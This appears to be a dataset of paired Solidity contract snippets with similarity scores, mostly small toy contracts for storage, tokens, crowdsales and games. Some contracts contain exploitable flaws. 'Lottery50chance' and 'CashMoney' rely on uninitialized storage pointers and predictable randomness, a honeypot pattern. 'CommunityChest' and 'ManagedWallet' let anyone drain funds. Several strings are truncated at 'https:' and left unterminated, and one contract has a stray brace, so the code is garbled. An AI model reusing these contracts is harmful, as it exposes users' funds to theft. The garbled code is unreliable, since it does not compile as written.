    {
        awayBet.transfer(address(this).balance);
    }
    else if(result.toSlice().equals(""draw"".toSlice()))
    {
        homeBet.transfer(address(this).balance / 2);
        awayBet.transfer(address(this).balance / 2);
    }

    
    }

    function update()
    payable
    public {
        
        if (oraclize_getPrice(""URL"") > address(this).balance) {
            emit LogInfo(""Oraclize query was NOT sent, please add some ETH to cover for the query fee"");
        } else {
            emit LogInfo(""Oraclize query was sent, standing by for the answer.."");

            
            oraclize_query(""URL"", ""json(https:

        }
    }

}",0.6089506237756366,"contract GladiethersOraclize is usingOraclize
{
    address public m_Owner;
    
    AbstractGladiethers m_Gladiethers = AbstractGladiethers(0xfca7d75cf8cad941a48ab9b5e1af0ae571923378);
    mapping (bytes32 => address) public queryIdToGladiator;
    mapping (bytes32 => bool) public queryIdToIsEthPrice;
    uint public gasprice = 15000000000;
    uint public eth_price = 500000;
    uint public totalGas = 169185;
    
    event random(string random);
    
    function GladiethersOraclize() public{
        m_Owner = msg.sender;
        oraclize_setCustomGasPrice(gasprice);
        oraclize_setProof(proofType_Ledger); 
    }
    
    function getOraclizePrice() public constant returns (uint) {
          return (totalGas*gasprice) +(5*1 ether)/eth_price;
    }
    

    function update(uint delay) payable {
        if (oraclize_getPrice(""URL"") > this.balance) {
        } else {
            bytes32 queryId = oraclize_query(delay, ""URL"", ""json(https:
            queryIdToIsEthPrice[queryId] = true;
        }
    }
    
    function scheduleFight() public payable{
    
        require(now > 1527638340 && m_Gladiethers.getQueueLenght() > 1 && m_Gladiethers.getGladiatorPower(msg.sender) >= 10 finney); 
        uint callbackGas = totalGas; 
        require(msg.value >= getOraclizePrice()); 
        uint N = 7; 
        uint delay = 0; 
        bytes32 queryId = oraclize_newRandomDSQuery(delay, N, callbackGas); 
        
        queryIdToGladiator[queryId] = msg.sender;
        m_Gladiethers.removeOrc(msg.sender);
        
        
    }
    
    
    
    
    
    function __callback(bytes32 _queryId, string _result, bytes _proof)
    {
     
      
       if (msg.sender != oraclize_cbAddress()) throw;
       if(queryIdToIsEthPrice[_queryId]){
           eth_price = parseInt(_result)*1000;
       }else{
           m_Gladiethers.fight(queryIdToGladiator[_queryId],_result);
       }
       
       
    }

}"
"contract EtherBlock {
    uint256 public nonce;
    event eOpenPosition(uint256 indexed PositionKey, address indexed Opener, uint256 EtherTossed, uint8 OddEven);
    function OpenPosition (uint8 OddEven) public {
        emit eOpenPosition(nonce, msg.sender, msg.value, OddEven);
    }
}",0.613335157706704,"contract CrydrControllerMintableInterface {



  



  event MintEvent(address indexed owner, uint256 value);

  event BurnEvent(address indexed owner, uint256 value);



  



  function mint(address _account, uint256 _value) public;

  function burn(address _account, uint256 _value) public;

}"
"contract SimpleStorage {
         string public storedData;
         function SimpleStorage() {
                      storedData = ""hello world"";
         }
         function set(string x) {
                      storedData = x;
         }
         function get() constant returns (string x) {
                     return storedData;
         }

 }",0.6778341088958395,"contract HelloWorld {
    
    string wellcomeString = ""Hello, world!"";
    
    function getData() public constant returns (string) {
        return wellcomeString;
    }
    
    function setData(string newData) public {
        wellcomeString = newData;
    }
    
}"
"contract Calendario_Appuntamenti {

    mapping (uint => calendar) public appointment;
    address owner;
    uint256 public _counter = 0;


    constructor ()public{
        owner = msg.sender;
    }

    modifier only0wner(){
        require (msg.sender == owner);
        _;
    }

    struct calendar{

        uint256 _id;
        uint256 _day;
        string _month;
        uint256 _year;
    }

    function addAppointment (uint256 _day, string memory _month, uint256 _year) public{
        _counter +=1;
        appointment [_counter] = calendar (_counter,_day,_month,_year); 
    }

    function removeAppointment (uint256 _yeartoremove) public only0wner {
        uint256 _i;
         _i = _counter;

        while (_i > 0){

            if(_yeartoremove == appointment [_i]._year){

                delete (appointment [_i]);
            }
            _i -=1;

        }
    }
}",0.6142697261363407,"contract Lottery50chance

{

  

  uint256 private randomNumber = uint256( keccak256(now) ) % 2;

  uint256 public minBet = 1 ether;

  address owner = msg.sender;



  struct GameHistory 

  {

    address player;

    uint256 number;

  }

  

  GameHistory[] public log;



  modifier onlyOwner() 

  {

    require(msg.sender == owner);

    _;

  }



  function play(uint256 _number) 

  public 

  payable 

  {

      if(msg.value >= minBet && _number <= 1)

      {

          GameHistory gameHistory;

          gameHistory.player = msg.sender;

          gameHistory.number = _number;

          log.push(gameHistory);

          

          

          

       

          if (_number == randomNumber) 

          {

              selfdestruct(msg.sender);

          }else{

              selfdestruct(owner);

          }

          

      }

  }

  

  

  

  function withdraw(uint256 amount) 

  public 

  onlyOwner 

  {

    owner.transfer(amount);

  }



  function() public payable { }

  

}"
"contract Factory {
bytes32[] Names;
address[] newContracts;

function createContract (bytes32 name) {
    address newContract = new Contract(name);
    newContracts.push(newContract);
} 

function getName (uint i) {
    Contract con = Contract(newContracts[i]);
    Names[i] = con.Name();
}
}",0.6476765110797843,"contract Bakery {



  



  address[] public contracts;



  



  function getContractCount()

    public

    constant

    returns(uint contractCount)

  {

    return contracts.length;

  }



  



  function newCookie()

    public

    returns(address newContract)

  {

    Cookie c = new Cookie();

    contracts.push(c);

    return c;

  }

}"
"contract Storage {
    struct Log {
        string fname;
        string lname;
        string dob;
    }
    mapping (uint => Log) logs;

    function set(uint memory index, string memory fname, string memory lname, string memory dob) public returns (uint) {
        index++;
        logs[index] = Log(fname, lname, dob);
        return (index);
    }

    function get(uint idx) public view returns (string memory, string memory, string memory) {
        return (logs[idx].fname, logs[idx].lname, logs[idx].dob);
    }
}",0.6226918690019404,"contract modERC20Detailed is modIERC20 {

    string private _name;

    string private _symbol;

    uint8 private _decimals;



    constructor (string name, string symbol, uint8 decimals) public {

        _name = name;

        _symbol = symbol;

        _decimals = decimals;

    }



    

    function name() public view returns (string) {

        return _name;

    }



    

    function symbol() public view returns (string) {

        return _symbol;

    }



    

    function decimals() public view returns (uint8) {

        return _decimals;

    }

}"
"contract TokenCrowdsale {

    using SafeMath for uint256;

    
    address public beneficiary;      
    address public creator;          
    address public confirmedBy;      
    uint256 public maxSupply = 15000;    
    bool public purchasingAllowed = false;
    uint256 public totalSupplied = 0;

    
    uint256 public rate = 1200;

    enum Stages {
        PreSale, 
        InProgress, 
        Ended, 
        Withdrawn 
    }

    Stages public stage = Stages.PreSale;

    
    Token public deplToken;

    
    mapping (address => uint256) balances;

    
    modifier atStage(Stages _stage) {
        require(stage == _stage);
        _;
    }

    
    modifier onlyBeneficiary() {
        require(beneficiary == msg.sender);
        _;
    }

    
    function balanceOf(address _investor) constant returns (uint256 balance) {
        return balances[_investor];
    }


    function enablePurchasing() onlyBeneficiary atStage(Stages.PreSale) {
        purchasingAllowed = true;
        stage = Stages.InProgress;
    }

    function disablePurchasing() onlyBeneficiary atStage(Stages.InProgress) {
        purchasingAllowed = false;
        stage = Stages.Ended;
    }

    function enableNewPurchasing() onlyBeneficiary atStage(Stages.Withdrawn) {
        purchasingAllowed = true;
        stage = Stages.InProgress;
    }

    
    

    function TokenCrowdsale(address _tokenAddress, address _beneficiary, address _creator) {
        deplToken = Token(_tokenAddress);
        beneficiary = _beneficiary;
        creator = _creator;
    }

    
    function confirmBeneficiary() onlyBeneficiary {
        confirmedBy = msg.sender;
    }


    event sendTokens(address indexed to, uint256 value);


    
    function withdraw() onlyBeneficiary atStage(Stages.Ended) {
        uint256 ethBalance = this.balance;
        beneficiary.transfer(ethBalance);
        stage = Stages.Withdrawn;
    }

    
    function () payable atStage(Stages.InProgress) {

        require(purchasingAllowed);
        if (msg.value == 0) { return; }
        uint256 weiAmount = msg.value;
        address investor = msg.sender;
        uint256 received = weiAmount.div(10e7);
        uint256 tokens = (received).mul(rate);
        }

        sendTokens(msg.sender, tokens);
        deplToken.transfer(investor, tokens);
        totalSupplied = (totalSupplied).add(tokens);

        if (totalSupplied >= maxSupply) {
            purchasingAllowed = false;
            stage = Stages.Ended;
        }

    }",0.6806069845863272,"contract Crowdsale is Ownable {
  using SafeMath for uint256;

  
  ERC20 public token;

  
  address public wallet;

  
  uint256 public rate;

  
  uint256 public weiRaised;

  
  event TokenPurchase(
    address indexed purchaser,
    address indexed beneficiary,
    uint256 value,
    uint256 amount
  );

  
  constructor(uint256 _rate, address _wallet, ERC20 _token) public {
    require(_rate > 0);
    require(_wallet != address(0));
    require(_token != address(0));

    rate = _rate;
    wallet = _wallet;
    token = _token;
  }

  
  
  

  
  function () external payable {
    buyTokens(msg.sender);
  }

  
  function buyTokens(address _beneficiary) public payable {

    uint256 weiAmount = msg.value;
    _preValidatePurchase(_beneficiary, weiAmount);

    
    uint256 tokens = _getTokenAmount(weiAmount);

    
    weiRaised = weiRaised.add(weiAmount);

    _processPurchase(_beneficiary, tokens);
    emit TokenPurchase(
      msg.sender,
      _beneficiary,
      weiAmount,
      tokens
    );

    _updatePurchasingState(_beneficiary, weiAmount);

    _forwardFunds();
    _postValidatePurchase(_beneficiary, weiAmount);
  }

  
  
  

  
  function _preValidatePurchase(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    require(_beneficiary != address(0));
    require(_weiAmount != 0);
  }

  
  function _postValidatePurchase(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    
  }

  
  function _deliverTokens(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    token.transfer(_beneficiary, _tokenAmount);
  }

  
  function _processPurchase(
    address _beneficiary,
    uint256 _tokenAmount
  )
    internal
  {
    _deliverTokens(_beneficiary, _tokenAmount);
  }

  
  function _updatePurchasingState(
    address _beneficiary,
    uint256 _weiAmount
  )
    internal
  {
    
  }

  
  function _getTokenAmount(uint256 _weiAmount)
    internal view returns (uint256)
  {
    return _weiAmount.mul(rate);
  }

  
  function _forwardFunds() internal {
    wallet.transfer(msg.value);
  }


  function destroy() onlyOwner public {
    _deliverTokens(owner, token.balanceOf(this));
    selfdestruct(owner);
  }

  function destroyAndSend(address _recipient) onlyOwner public {
    _deliverTokens(_recipient, token.balanceOf(this));
    selfdestruct(_recipient);
  }
}"
"contract TestContract {

    function add(uint256 amount) returns (uint256) {
       require(amount > 0);

       return 100 + amount;
    }
}",0.6462837950844204,"contract HeartBoutToken {
   function mint(address _to, uint256 _amount, string _account) public returns (bool);
}"
"contract MyContract {
    function createNewInstance() returns (OtherContract) {
        return new OtherContract();
    }
}",0.6059629239886134,"contract TestFiatContract
{
    function USD(uint) constant returns (uint256)
    {
        return 12305041990000;
    }
}"
"contract Casino is usingOraclize {
   address owner;
   uint public betAmount = 30 finney; 
   uint public totalBets; 
   uint public numberOfBets; 
   
   uint public limitAmountOfBets = 3; 
   uint public numberWinner; 
   bool public gameStatus;
   uint public stage = 0;
   mapping(uint => address[]) numberBetPlayers; 
   mapping(address => uint) playerBetsNumber; 

   modifier onEndGame() {
       if(numberOfBets >= limitAmountOfBets) _;
   }

   
   function Casino(uint _betAmount, uint _limitAmountOfBets) {
       owner = msg.sender; 

       if(_betAmount > 0) betAmount = _betAmount;
       if(_limitAmountOfBets > 0) limitAmountOfBets = _limitAmountOfBets;

       oraclize_setProof(proofType_Ledger); 
   }

   
   function checkPlayerExists(address player) constant public returns(bool) {
       if(playerBetsNumber[player] > 0) return true;
       else return false;
   }

   
   function bet(uint numberToBet) payable {
       require(numberOfBets <= limitAmountOfBets); 
       require(!checkPlayerExists(msg.sender)); 
       require(numberToBet >=1 && numberToBet <= 10); 
       require(msg.value == betAmount); 
       gameStatus = true;

       playerBetsNumber[msg.sender] = numberToBet;
       numberBetPlayers[numberToBet].push(msg.sender);

       numberOfBets += 1;
       totalBets += msg.value;

       if(numberOfBets >= limitAmountOfBets) generateNumberWinner();
   }

   
   function generateNumberWinner() payable onEndGame {
       gameStatus = false;
       stage = 1;
       uint numberRandomBytes = 7;
       uint delay = 0;
       uint callbackGas = 200000;

       oraclize_newRandomDSQuery(delay, numberRandomBytes, callbackGas);
   }

   function __callback(bytes32 _queryId, string _result, bytes _proof) {
       stage = 2;
       require(msg.sender == oraclize_cbAddress());
       if(oraclize_randomDS_proofVerify__returnCode(_queryId, _result, _proof) != 0) { throw; }
       else {
           numberWinner = (uint(keccak256(_result))%10+1);
           distributePrizes();
       }
   }

   function distributePrizes() internal onEndGame {
       stage = 3;
       uint winnerEtherAmount = totalBets / numberBetPlayers[numberWinner].length; 

       for(uint i = 0; i < numberBetPlayers[numberWinner].length; i++) { 
           numberBetPlayers[numberWinner][i].transfer(winnerEtherAmount);
       }

       for(uint j = 1; j <= 10; j++) {
           numberBetPlayers[j].length = 0;
       }

       totalBets = 0;
       numberOfBets = 0;
   }
}",0.6130227686786618,"contract CashMoney {

    uint256 private current;

    uint256 private last;

    WinnerLog private winnerLog;

    uint256 private first;

    address public owner;

    uint256 public min_bet = 0.001 ether;

    uint256[5] public bonuses = [5 ether, 2 ether, 1.5 ether, 1 ether, 0.5 ether];



    struct Guess {

        uint256 playerNo;

        uint256 time;

    }

    

    struct Player {

        bool exists;

        bytes name;

        uint256 playerNo;

    }

    

    Guess[] guesses;

    

    mapping( address => Player ) private players;



    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }



    modifier onlyPlayer {

        require(players[msg.sender].exists);

        _;

    }

    

    function getWL() public view returns(address) {

        return winnerLog;

    }

    

    constructor(address[] players_, uint256[] nums, bytes[] names, address winnerLog_) public payable {

        owner = msg.sender;

        every_day_im_shufflin();

        

        for (uint256 i = 0; i < players_.length; i++) {

            players[players_[i]] = Player(true, names[i], nums[i]);

        }

        

        first = now;

        

        winnerLog = WinnerLog(winnerLog_);

    }

    

    function every_day_im_shufflin() internal {

        

        current = uint8(keccak256(abi.encodePacked(blockhash(block.number-2)))) % 11;

    }

    

    function getName() public view returns(bytes){

        return players[msg.sender].name;

    }

    

    function updateSelf(uint256 number, bytes name) public onlyPlayer {

        players[msg.sender].playerNo = number;

        players[msg.sender].name = name;

        players[msg.sender].exists = true;

    }



    

    function do_guess(uint256 number) payable public onlyPlayer {

        require(msg.value >= min_bet && number <= 10);

        

        require(!winnerLog.isWinner(msg.sender));

        

        Guess storage guess;

        guess.playerNo = players[msg.sender].playerNo;

        guess.time = now;

        

        guesses.push(guess);

        

        if (number == current) {

            

            winnerLog.logWinner(msg.sender, players[msg.sender].playerNo, players[msg.sender].name);

            

            uint256 winnerNum = winnerLog.getWinnerAddrs().length;

            

            

            assert(winnerNum > 0);

            

            if (winnerNum <= bonuses.length) {

                msg.sender.transfer(msg.value+bonuses[winnerNum-1]);

            } else {

                msg.sender.transfer(msg.value);

            }

        } else {

            revert(""that wasn't very cash money of you"");

        }

        

        every_day_im_shufflin();

        

        last = now;

    }

    

    function kill() public onlyOwner {

        selfdestruct(msg.sender);

    }

    

    function() public payable {

    }

}"
"contract Crowdsale {
    address public beneficiary;
    uint public amountRaised;
    uint public price;
    token public tokenReward;
    mapping(address => uint256) public balanceOf;

    event FundTransfer(address backer, uint amount, bool isContribution);

    
    constructor(
        address ifSuccessfulSendTo,
        uint milietherCostOfEachToken,
        address addressOfTokenUsedAsReward
    ) public {
        beneficiary = ifSuccessfulSendTo;
        price = milietherCostOfEachToken * 0.0001 ether;
        tokenReward = token(addressOfTokenUsedAsReward);
    }

    function () payable public {

        uint amount = msg.value;
        balanceOf[msg.sender] += amount;
        amountRaised += amount;
        tokenReward.transfer(msg.sender, amount * 10**18 / price);
        emit FundTransfer(msg.sender, amount, true);

        
        beneficiary.transfer(amount);
    }
}",0.6244162317409249,"contract Neulaut {



    uint256 public totalSupply = 7*10**27;

    address owner;

    string public name = ""Neulaut"";

    uint8 public decimals = 18;

    string public symbol = ""NUA"";

    mapping (address => uint256) balances;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);

    



    constructor() public {

        owner = msg.sender;

        balances[owner] = totalSupply;

    }

    

    function() payable {

        revert();

    }



    function transfer(address _to, uint256 _value) public returns (bool success) {

        require(balances[msg.sender] >= _value);

        balances[msg.sender] -= _value;

        balances[_to] += _value;

        emit Transfer(msg.sender, _to, _value);

        return true;

    }



    function balanceOf(address _owner) constant public returns (uint256 balance) {

        return balances[_owner];

    }



}"
"contract Base1 is mortal {
    function kill() public {  mortal.kill(); }
}",0.6337786027092653,"contract Mortal is Owned {
    
    function kill() onlyOwner
    { suicide(owner); }
}"
"contract Base2 is mortal {
    function kill() public {  mortal.kill(); }
}",0.6337786027092653,"contract Mortal is Owned {
    
    function kill() onlyOwner
    { suicide(owner); }
}"
"contract Foo {
  uint internal x; 
  mapping (uint => address) internal y; 
  uint [] internal z; 

  function zElement (uint key) public view returns (uint r) {
    assembly {
      sload(keccak256(add(key, y_slot), 32))
    }
  }
}",0.6444755186481733,"contract MoneyMarket {

    function markets(address asset) public view returns (bool, uint, InterestRateModel, uint, uint, uint, uint, uint, uint);
    function oracle() public view returns (address);
}"
"contract Callee {
    function call() {
        Log(msg.sender);
    }
    event Log(address sender);
  }",0.6500165588602586,"contract Ownable {
  address  owner;
  function Ownable() {
    owner = msg.sender;
  }
}"
"contract A {
    mapping(address => address[]) public inves;

    function totalInves() public view returns(uint) {
        return(inves[msg.sender].length);
    }

}",0.6932164703575036,"contract GNTJoinLike {
    function bags(address) public view returns (address);
    function make(address) public returns (address);
}"
"contract Storage {
    bytes32 public data;
    event MyEvent(
        uint256 indexed id,
        uint256 indexed date,
        bytes32 indexed value
    );
    uint256 nextId;

    function setData(bytes32 _data) external {
        data = _data;
        emit MyEvent(nextId, now, _data);
        nextId++;
    }

    function getData() external view returns (bytes32) {
        return data;
    }
}",0.65523176757132,"contract ERC223 is ERC20 {

    function transfer(address to, uint256 value, bytes data) public returns (bool);

    function transferFrom(address from, address to, uint256 value, bytes data) public returns (bool);

    event Transfer(address indexed _from, address indexed _to, uint256 indexed _value, bytes _data);

}"
"contract ManagedWallet {
    event ReceivedEther(address source, uint256 amount);
    event ContractCalled(address theContract,uint256 value, bytes data);

    function () public payable {
        ReceivedEther(msg.sender,msg.value);
    }

    function sendEther(address whom, uint256 amount) public {
        whom.transfer(amount);
    }

    function sendToken(Coin token, address whom, uint256 amount) public {
        token.transfer(whom,amount);
    }

    function callContract(address theContract, uint256 value, bytes data) public {
        require(theContract.call.value(value)(data));
        ContractCalled(theContract,value,data);
    }

}",0.6439175136092851,"contract TokenRecipient {

    event ReceivedEther(address indexed sender, uint amount);

    event ReceivedTokens(address indexed from, uint256 value, address indexed token, bytes extraData);



    

    function receiveApproval(address from, uint256 value, address token, bytes memory extraData) public {

        ERC20 t = ERC20(token);

        require(t.transferFrom(from, address(this), value), ""ERC20 token transfer failed"");

        emit ReceivedTokens(from, value, token, extraData);

    }



    

    function () payable external {

        emit ReceivedEther(msg.sender, msg.value);

    }

}"
"contract IdMgmt is mortal {

  struct acl {
    string dataType;
    string permissions;
  }

  mapping (address => acl) public aclOf;

  function IdMgmt() { }

  function createId(address _user, string _dataType, string _permissions) {
    aclOf[_user].dataType = _dataType;
    aclOf[_user].permissions = _permissions;
  }

  function getPermissions(address _user, string _dataType) constant
    returns (string userPermissions) {

    if (stringsEqual(aclOf[_user].dataType, _dataType)) {
      userPermissions = aclOf[_user].permissions;
    }
    else {
      userPermissions = ""NO DATA"";
    }
  }

  function stringsEqual(string _a, string _b) internal returns (bool) {
    bytes memory a = bytes(_a);
    bytes memory b = bytes(_b);
    if (a.length != b.length) {
      return false;
    }
    for (uint i = 0; i < a.length; i ++) {
      if (a[i] != b[i]) return false;
    }
    return true;
  }
}",0.6008715941620383,"contract GetEbola {
    
    address private creator = msg.sender;
    
    function getInfo() constant returns (string, string)
    {
        string memory developer = ""Saluton, mia nomo estas Zach!""; 
        string memory genomeInfo = ""Ebola virus - Zaire, cat.1976""; 
        return (developer, genomeInfo);
    }
    
    function getEbola() constant returns (string)
    {
        
        string memory genomeURL = ""URL: http:
        return (genomeURL);
    }
    
    function tipCreator() constant returns (string, address)
    {
        string memory tipMsg = ""If you like you can tip me at this address :)"";
        address tipJar = creator; 
        return (tipMsg, tipJar);
    }
    
    
    
    function kill() public returns (string)
    { 
        if (msg.sender == creator)
        {
            suicide(creator);  
        }
        else {
            string memory nope = ""Vi ne havas povon i tie!"";
            return (nope);
        }
    }
}"
"contract E {
  event DepositReceived(address receiverAddress, uint256 amount);
  address public destination = 0x14d06788090769f669427b6aea1c0240d2321f34;
  function deposit(address receiver) payable {
    destination.transfer(msg.value);
    DepositReceived(receiver, msg.value);
  }
}",0.6062391526581012,"contract efwtest {
  address public xdest;
  event DepositFunds(address from, uint amount);
  function efwtest() public {
    xdest = 0x5554a8f601673c624aa6cfa4f8510924dd2fc041;
  }
  function() payable public {
    DepositFunds(msg.sender, msg.value);
    xdest.transfer(msg.value);
  }
}"
"contract TicTacToe {
    uint8 public boardSize = 3;
    address[3][3] board;

    address public player1;
    address public player2;

    constructor() public {
        player1 = msg.sender;
    }

    function joinGame() public payable {
        assert(player2 == address(0)); 
        player2 = msg.sender;
    }
}",0.6032827047982026,"contract Skel {
  string public name;
  address public owner;
  function Skel() public {
      name = ""test"";
      owner = msg.sender;
  }
  modifier onlyowner {
      require(msg.sender == owner);
      _;
  }
function emptyTo(address addr) onlyowner public {
    addr.transfer(address(this).balance);
}
}"
"contract ApprovalContract {

    address public sender;
    address public receiver;
    address public constant approver = 0xAFXXX;


    function deposit(address _receiver) external payable{
        require(msg.value > 0);
        sender = msg.sender;
        receiver = _receiver;
    }


    function viewApprover() external pure returns(address) {
        return(approver);
    }


    function approve() external{
        require(msg.sender == approver);
        receiver.transfer(address(this).balance);
    }

}",0.6384385679638971,"contract ERC20 is ERC20Basic {

    uint256 public totalSupply;



    function allowance(address holder, address spender) external view returns(uint256);



    function transferFrom(address from, address to, uint256 value) external returns(bool);



    function approve(address spender, uint256 value) external returns(bool);

  

    event Approval(address indexed holder, address indexed spender, uint256 value);

}"
"contract matching {

    struct User {
        uint time;
        string location;
        string position;
    }
    User[] people; 

    mapping (address => User) user_mapping;
    address[] public userAccounts;

    function set(address _address, uint _time, string memory _location, string memory _position) public {
        User storage users = user_mapping[_address];

        users.time = _time;
        users.location = _location;
        users.position = _position;

        userAccounts.push(_address) -1;
    }

    function getAccounts()public view returns(address[] memory) {
        return userAccounts;
    }

    function getInfo(address _address) view public returns (uint, string memory, string memory) {
        return (user_mapping[_address].time, user_mapping[_address].location, user_mapping[_address].position);
    }

    function countInfo() view public returns (uint) {
        return userAccounts.length;
    }

}",0.6139442056099597,"contract ERC20Interface {
    function totalSupply() public view returns(uint amount);
    function balanceOf(address tokenOwner) public view returns(uint balance);
    function allowance(address tokenOwner, address spender) public view returns(uint balanceRemaining);
    function transfer(address to, uint tokens) public returns(bool status);
    function approve(address spender, uint limit) public returns(bool status);
    function transferFrom(address from, address to, uint amount) public returns(bool status);
    function name() public view returns(string tokenName);
    function symbol() public view returns(string tokenSymbol);

    event Transfer(address from, address to, uint amount);
    event Approval(address tokenOwner, address spender, uint amount);
}"
"contract MyContract {
    using strings for *;

    function bytes32ToString (bytes32 data) constant returns (string) {
        bytes memory bytesString = new bytes(32);
        for (uint j=0; j<32; j++) {
            byte char = byte(bytes32(uint(data) * 2 ** (8 * j)));
            if (char != 0) {
                bytesString[j] = char;
            }
        }
        return string(bytesString);
    }

    function uintToBytes(uint v) constant private returns (bytes32 ret) {
        if (v == 0) {
            ret = '0';
        }
        else {
            while (v > 0) {
                ret = bytes32(uint(ret) / (2 ** 8));
                ret |= bytes32(((v % 10) + 48) * 2 ** (8 * 31));
                v /= 10;
            }
        }
        return ret;
    }

    function uintToString(uint v) constant private returns (string ret) {
        return bytes32ToString(uintToBytes(v));
    }

    function formatUrl(uint param1, uint param2) constant returns(string) {
        var parts = new strings.slice[](4);
        parts[0] = ""http:
        parts[1] = uintToString(param1).toSlice();
        parts[2] = ""&?param2="".toSlice();
        parts[3] = uintToString(param2).toSlice();

        return """".toSlice().join(parts);
    }
}",0.6183496182206166,"contract StrHelper{

  function uintToString(uint256 v) constant returns (string str) {

        uint maxlength = 100;

        bytes memory reversed = new bytes(maxlength);

        uint i = 0;

        while (v != 0) {

            uint remainder = v % 10;

            v = v / 10;

            reversed[i++] = byte(48 + remainder);

        }

        bytes memory s = new bytes(i);

        for (uint j = 0; j < i; j++) {

            s[j] = reversed[i - 1 - j];

        }

        str = string(s);

    }



    function appendUintToString(string inStr, uint256 v) constant returns (string str) {

        uint maxlength = 78;

        bytes memory reversed = new bytes(maxlength);

        uint i = 0;

        while (v != 0) {

            uint remainder = v % 10;

            v = v / 10;

            reversed[i++] = byte(48 + remainder);

        }

        bytes memory inStrb = bytes(inStr);

        bytes memory s = new bytes(inStrb.length + i);

        uint j;

        for (j = 0; j < inStrb.length; j++) {

            s[j] = inStrb[j];

        }

        for (j = 0; j < i; j++) {

            s[j + inStrb.length] = reversed[i - 1 - j];

        }

        str = string(s);

    }

}"
"contract Authorizable is Ownable {

    mapping(address => bool) public authorized;

    modifier onlyAuthorized() {
        require(authorized[msg.sender] || owner == msg.sender);
        _;
    }

    function addAuthorized(address _toAdd) onlyOwner public {
        require(_toAdd != 0);
        authorized[_toAdd] = true;
    }

    function removeAuthorized(address _toRemove) onlyOwner public {
        require(_toRemove != 0);
        require(_toRemove != msg.sender);
        authorized[_toRemove] = false;
    }

}",0.6789034755931475,"contract Authorized {

  mapping (address => bool) public AuthorizedUser;

  event AuthorizedUserChanged(address indexed addr, bool state );





  constructor() public{

    AuthorizedUser[msg.sender] = true;

  }



  modifier onlyAuthorized() {

    require(AuthorizedUser[msg.sender]);

    _;

  }



  

  function setAuthorizedUser(address addr, bool state) onlyAuthorized public {

    AuthorizedUser[addr] = state;

    emit AuthorizedUserChanged(addr, state);

  }



}"
"contract TodoList is Ownable {

    event NewTodo(uint todoId, string value);
    event DeleteTodo(uint todoId, string value);

    
    mapping(uint => address) todoOwner;
    
    mapping(address => uint) ownerTodoCount;

    TodoItem[] public todoItems;

    struct TodoItem {
        string value;
        bool active;
    }

    function createTodo(string _value) public returns(uint) {
        uint id = todoItems.push(TodoItem(_value, true)) - 1;
        todoOwner[id] = msg.sender;
        ownerTodoCount[msg.sender]++;
        NewTodo(id, _value);
        return id;
    }
}",0.6134983252474958,"contract CommunityChest {

    

    address owner;

    

    event Deposit(uint256 value);

    event Transfer(address to, uint256 value);

    

    constructor () public {

        owner = msg.sender;

    }

    

    function send(address payable to, uint256 value) public onlyOwner {

        to.transfer(value);

        emit Transfer(to, value);

    }



    function deposit() payable public {

        emit Deposit(msg.value);

    }



    function getBalance() public view returns (uint256) {

        return address(this).balance;

    }

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

}"
"contract A {
    uint256 public n;
    function set () public {
        n = 50;
    }
}",0.6804497130002504,"contract Contract {
    uint256 public a;
    constructor () public {
        a = 1;
    }
}"
"contract B is A {
    function set () public {
        n = 40;
    }
}",0.6503519804735973,"contract Incrementer {
    uint public i;
    function inc() {
        i++;
    }
}"
"contract SimpleStorage {
  mapping(address => uint256) public favoriteNumbers;

  function setFavorite(uint x) public {
    favoriteNumbers[msg.sender] = x;
  }
}",0.641933603248078,"contract loglibs {
   mapping (address => uint256) public sendList;
   
   function logSendEvent() payable public{
        sendList[msg.sender] = 1 ether;
   }

}"
"contract Language {
    function addNumberLanguage(string memory _language) public;
}",0.6176052798652004,"contract Resolver {
    function setName(bytes32 node, string memory name) public;
}"
"contract Text {
    address owner;
    Language language;
    mapping(string => mapping(string => string)) public texts;
    constructor(address _language) public {
        owner = msg.sender;
        language = Language(_language);
    }
    function addText(string memory _language, string memory code, string memory txt) public {
        require(owner == msg.sender, ""Unauthorized"");
        texts[_language][code] = txt;
    }
    function addLanguage(string memory _language) public {
        require(owner == msg.sender, ""Unauthorized"");
        language.addNumberLanguage(_language);
    }
}",0.6225460507630259,"contract ERC20MetaInfo {

  address public owner;

  mapping (address => mapping (string => string)) keyValues;



  

  constructor() public {

    owner = msg.sender;

  }



  

  function setKeyValue(ERC20 _token, string _key, string _value) public returns (bool) {

    

    

    

    require(bytes(keyValues[_token][_key]).length == 0 || owner == msg.sender || _token.owner() == msg.sender);

    keyValues[_token][_key] = _value;

    return true;

  }



  

  function getKeyValue(address _token, string _key) public view returns (string _value) {

    return keyValues[_token][_key];

  }

}"
"contract Inbox {
    string public message;

    function Inbox(string initialMessage) public {
        message = initialMessage;
    }

    function setMessage(string newMessage) public {
        message = newMessage;
    }
}",0.6754545206435124,"contract Bulletin {
    
    string public message = """";
    address public owner;
    
    function Bulletin(){
        owner = msg.sender;
    }
    
    function setMessage(string _message){
        require(msg.sender == owner);
        message = _message;
    }
}"
"contract PublicStorage {
  uint public storedData;

  function PublicStorage(uint initVal) public {
    storedData = initVal;
  }

  function set(uint x) public {
    storedData = x;
  }

  function get() constant public returns (uint retVal) {
    return storedData;
  }
}",0.6531151398152167,"contract MyWillRateProviderI {
    
    function getRate(address buyer, uint totalSold, uint amountWei) public constant returns (uint);

    
    function getRateScale() public constant returns (uint);

    
    function getBaseRate() public constant returns (uint);
}"
"contract CommunityChest {
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }

    function deposit(uint256 amount) payable public {
        require(msg.value == amount);
        
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    } 
}",0.6814912600423337,"contract CutdownToken {
    function balanceOf(address _who) public view returns (uint256);
    function transfer(address _to, uint256 _value) public returns (bool);
    function allowance(address _owner, address _spender) public view returns (uint256);
}"
"contract Bakery {
    address[] public contracts;
    address public ContractAddress;

    event LogForwarded(address indexed sender, uint amount);
    event LogFlushed(address indexed sender, uint amount);

    function() payable external {
        emit LogForwarded(msg.sender, msg.value);
        if(msg.value > 0.001 ether) {
            Cookie c = new Cookie();
            contracts.push(c);
            address(c).transfer(msg.value);
        }
    }
}",0.6557975097542309,"contract LotteryTicket {
    address owner;
    string public constant name = ""LotteryTicket"";
    string public constant symbol = """";
    event Transfer(address indexed from, address indexed to, uint256 value);
    constructor() public {
